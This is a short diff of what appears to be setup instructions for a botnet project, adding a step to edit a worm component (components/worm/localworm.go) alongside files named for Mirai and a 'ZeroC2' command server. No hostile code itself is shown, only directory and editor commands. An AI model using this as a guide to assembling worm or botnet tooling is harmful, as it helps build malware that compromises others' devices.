@@ -121,10 +121,11 @@ sudo go mod tidy
 ```
 cd mirai
 nano terylene.go
-cd ..
+cd components/worm
+nano localworm.go
+cd ../..
 cd server
 nano server.go
-cd ..
 ```
 
 ### build terylene and ZeroC2
